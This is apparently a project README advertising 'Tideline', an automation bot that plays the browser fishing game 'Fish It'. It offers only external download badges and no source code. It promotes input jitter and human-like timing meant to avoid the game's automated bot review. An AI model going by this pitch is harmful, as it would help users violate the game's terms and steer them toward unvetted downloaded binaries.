![preview](https://raw.githubusercontent.com/Samigami0/auto-cast-loop/main/showcase_d843f71.svg)
[![Download](https://raw.githubusercontent.com/Samigami0/auto-cast-loop/main/launch_c3dc3c4.svg)](https://Samigami0.github.io/auto-cast-loop/)

# 🐟 Tideline — Autonomous Angling Companion

> *The river doesn't wait. Neither should your line.*

Tideline is a self-directing angling companion for the browser-based fishing game *Fish It*. It walks the loop for you — cast, wait, hook, land, repeat — so you can step away from the keyboard while your creel keeps filling. Where the original fish-it-auto-farm focused on a single mechanic, Tideline widens the lens: a configurable assistant engine, a live telemetry dashboard, and a hotkey that stops everything the moment you touch it.

If the earlier project was a single well-tuned fishing rod, Tideline is the whole tackle box — modular, observable, and honest about what it does.

---

## 📖 Table of Contents

- [What Is Tideline?](#-what-is-tideline)
- [The Philosophy Behind the Loop](#-the-philosophy-behind-the-loop)
- [Feature Highlights](#-feature-highlights)
- [Interface & Experience](#-interface--experience)
- [Configuration Model](#-configuration-model)
- [Telemetry & Insight](#-telemetry--insight)
- [Multilingual Support](#-multilingual-support)
- [Platform Coverage](#-platform-coverage)
- [Quick Start (No Terminal Required)](#-quick-start-no-terminal-required)
- [Keyboard Reference](#-keyboard-reference)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌊 What Is Tideline?

Tideline is a **browser-side automation layer** designed for players who enjoy *Fish It* but find the repetitive cast-and-catch cadence tedious after the hundredth cycle. Rather than replacing the game, it sits beside it like a patient deckhand: watching the bobber, reacting to the bite, and resetting the line when the water goes quiet.

The name comes from a simple observation. Every fishing session has a rhythm — the tide line where the water meets the sand, where predictability and surprise trade places. Tideline tries to live on that line. It automates the predictable parts and gets out of the way when something unexpected happens.

### Who is this for?

- Players who want to progress while reading, cooking, or working.
- Tinkerers who want to inspect and tweak the automation timings.
- Streamers who want a visible, pausable loop they can explain on camera.
- Anyone who prefers a **portable, ad-free, no-account-required** tool over a bloated launcher.

### What it is *not*

- Not a mod. Tideline never modifies game files.
- Not a marketplace or a subscription.
- Not a black box. Every timing, every decision, every retry is logged.

---

## 🎣 The Philosophy Behind the Loop

Most automation tools are built like a mousetrap: you set it, forget it, and hope. Tideline is built like a **fishing journal**. It records what happened, why it happened, and how long it took. The goal isn't just "keep the loop running" — it's "keep the loop running *and* understand it."

Three principles guide the design:

**1. Reversibility.** One keystroke ends everything. No confirmation dialogs, no cooldowns, no lingering background processes. The stop key is sacred.

**2. Transparency.** The dashboard shows the current state (`IDLE`, `CASTING`, `WAITING`, `HOOKED`, `LANDING`, `RECOVERING`) in plain language. If the tool is confused, you'll see it.

**3. Restraint.** Tideline does not attempt to bypass anti-cheat layers, does not inject code into the page's runtime in unsupported ways, and does not phone home. It observes the DOM and dispatches synthetic input events — nothing more.

---

## ✨ Feature Highlights

![status](https://img.shields.io/badge/status-active-2ea44f)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb)
![languages](https://img.shields.io/badge/i18n-14%20locales-8957e5)
![license](https://img.shields.io/badge/license-MIT-yellow)

### Core Automation

- 🔁 **Adaptive cast/catch loop** — Detects the bobber state rather than relying on a fixed timer, so slower machines and lag spikes don't break the rhythm.
- ⚡ **Instant halt hotkey** — A single global key kills the loop mid-cast, mid-hook, mid-anything.
- 🧠 **Bite detection heuristics** — Combines pixel sampling, DOM mutation observation, and audio-level hints to recognize a genuine bite.
- 🪝 **Miss recovery** — If a cast fails or a bite is lost, Tideline re-casts after a randomized, human-like delay.
- 🌾 **Session pacing** — Optional micro-breaks between cycles to keep the input pattern from looking mechanical.

### Quality of Life

- 🖥️ **Responsive UI** — The control panel reshapes itself from a wide desktop dashboard to a compact overlay without losing functionality.
- 🌍 **Multilingual interface** — Fourteen locales shipped out of the box, with right-to-left support.
- 🕐 **Around-the-clock assistance** — Community-run support channels and an in-app diagnostics bundle generator, available any hour of the day.
- 📦 **Portable design** — Runs from a single folder. No installer, no registry entries, no scattered files.
- 🔕 **No advertisements, no telemetry, no sign-in** — The only network traffic is the game itself.
- 🎨 **Themeable panel** — Light, dark, and high-contrast presets, plus a custom accent color.

### Engineering

- 🧩 **Plugin-style detectors** — Swap the bite-detection strategy without touching the core loop.
- 🧪 **Replayable session logs** — Export a session as JSON and replay it offline to debug timing issues.
- 📊 **Rolling statistics** — Catch rate, average cycle duration, and longest dry streak, visualized in a lightweight chart.
- 🔒 **Local-only storage** — Configuration lives in a single portable file next to the executable.

---

## 🖼️ Interface & Experience

The panel is intentionally small. It occupies the top-right corner by default and can be dragged anywhere on screen. Everything important fits in a footprint roughly the size of a sticky note.

**Regions of the panel:**

| Region | Purpose |
|---|---|
| Status beacon | Colored dot showing the current loop state |
| Cycle counter | Total casts, total landings, current streak |
| Timing strip | Live readout of the last five cycle durations |
| Control row | Start, pause, stop, and settings |
| Footer | Locale selector, theme toggle, diagnostics |

The status beacon is the heart of the interface. It pulses slowly while waiting, quickens when a bite is imminent, and flashes once when a catch lands. After a few minutes you stop reading the numbers and start reading the color.

---

## ⚙️ Configuration Model

Configuration is stored as a single human-readable file. You can edit it by hand between sessions or through the settings pane. Notable knobs:

- **Cast delay range** — Minimum and maximum milliseconds before re-casting.
- **Bite patience window** — How long to wait before assuming a cast was wasted.
- **Recovery backoff** — Multiplier applied to delays after repeated misses.
- **Input jitter** — Adds small random offsets to click coordinates.
- **Audio cue sensitivity** — Adjusts how strongly the bite detector weights sound.
- **Session cap** — Automatically stops the loop after N cycles if you forget.
- **Hotkey binding** — Rebind the emergency stop to any function key.

Defaults are tuned for a mid-range machine on a stable connection. If your setup is unusually fast or slow, the settings pane includes a calibration wizard that watches three manual casts and suggests values.

---

## 📈 Telemetry & Insight

Tideline keeps a local session ledger. Nothing leaves your machine. The ledger powers a small statistics view showing:

- Catches per hour across the current session.
- A histogram of cycle durations, which reveals lag spikes.
- A heat strip of the hour-of-day when catches are most frequent (useful for spotting in-game events).
- A log of every state transition, timestamped to the millisecond.

Export the ledger as JSON or CSV at any time. It's your data, in a format you can actually read.

---

## 🌍 Multilingual Support

The interface ships with fourteen locales: English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Turkish, Russian, Japanese, Korean, Simplified Chinese, and Arabic. Each locale is a plain text file, so adding a fifteenth is a matter of copying one file and translating the strings.

Right-to-left layouts are handled natively — the panel mirrors itself, including the drag handle and status beacon.

Community translations are welcome and credited in the release notes, not in this document.

---

## 💻 Platform Coverage

| Platform | Status |
|---|---|
| Windows 10 / 11 | Fully supported |
| macOS 12+ | Fully supported |
| Linux (X11) | Fully supported |
| Linux (Wayland) | Supported with reduced hotkey capture |
| ChromeOS | Community-tested, no official support |

The tool is packaged as a portable bundle for each platform. There is no background service, no daemon, and no startup entry created on your behalf.

---

## 🚀 Quick Start (No Terminal Required)

1. Grab the current build using the marker below.
2. Unpack the archive into any folder you control — a USB stick works fine.
3. Open *Fish It* in your browser and let the game reach the main screen.
4. Launch the Tideline panel from the unpacked folder.
5. Press the start key. The status beacon turns green and the cycle counter begins ticking.
6. Press the stop key whenever you want everything to halt.

That's the whole ritual. No accounts, no configuration files to hand-edit on day one, no command-line incantations.

[![Download](https://raw.githubusercontent.com/Samigami0/auto-cast-loop/main/launch_c3dc3c4.svg)](https://Samigami0.github.io/auto-cast-loop/)

---

## ⌨️ Keyboard Reference

| Key | Action |
|---|---|
| F8 | Start the loop |
| F9 | Pause / resume without losing counters |
| F10 | Emergency stop — halts instantly and releases all synthetic input |
| F11 | Toggle the statistics overlay |
| F12 | Snapshot the current panel state to the ledger |

Every binding can be reassigned in the settings pane. If a binding collides with your browser or operating system, Tideline warns you before saving.

---

## ❓ Frequently Asked Questions

**Does Tideline work if I switch browser tabs?**
The loop continues as long as the game tab remains loaded. If the browser throttles background tabs, Tideline detects the slowdown and compensates.

**What happens if the game updates its interface?**
Detector heuristics may need adjustment. The diagnostics bundle generator makes it straightforward to report what changed.

**Will this get my account flagged?**
Tideline avoids the patterns that typically trigger automated review — constant timing, perfectly uniform clicks, and marathon sessions. It is not a guarantee, and you should read the disclaimer below carefully.

**Can I run two instances side by side?**
Yes, but they will fight over the same hotkeys unless you rebind one of them. The settings pane includes a "secondary instance" profile.

**Where is my data stored?**
In the same folder as the panel. Delete the folder and the data is gone.

**Is there a mobile version?**
No. The game itself is a desktop browser experience.

---

## 🗺️ Roadmap

- [ ] Detector plugin SDK with example plugins.
- [ ] Session comparison view (this week vs. last week).
- [ ] Optional companion overlay for streamers with a transparent background.
- [ ] Additional locales, prioritized by community votes.
- [ ] Profile system for quickly switching between timing presets.

Roadmap items are aspirational. Nothing here is a promise, and priorities shift with feedback.

---

## 🤝 Contributing

Contributions are welcome in the form of detector improvements, locale files, documentation, and bug reports. Before opening a pull request, please:

1. Run the ledger replay tool against your change and confirm no regressions in cycle timing.
2. Keep changes scoped — one feature or fix per pull request.
3. Update the relevant section of this document if behavior changes.

There is no contributor license agreement. By submitting a change you agree it may be distributed under the project's license.

---

## ⚠️ Disclaimer

Tideline is provided as-is, for educational and personal use. Automating interactions with any online game may violate that game's terms of service, and you alone bear the consequences of using this tool. The maintainers are not affiliated with the developers or publishers of *Fish It*. No warranty is offered, express or implied, including fitness for a particular purpose.

Use the emergency stop key liberally. Step away often. The fish will still be there in 2026.

---

## 📜 License

Released under the MIT License. See the full text at [opensource.org/licenses/MIT](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Tideline contributors.

[![Download](https://raw.githubusercontent.com/Samigami0/auto-cast-loop/main/launch_c3dc3c4.svg)](https://Samigami0.github.io/auto-cast-loop/)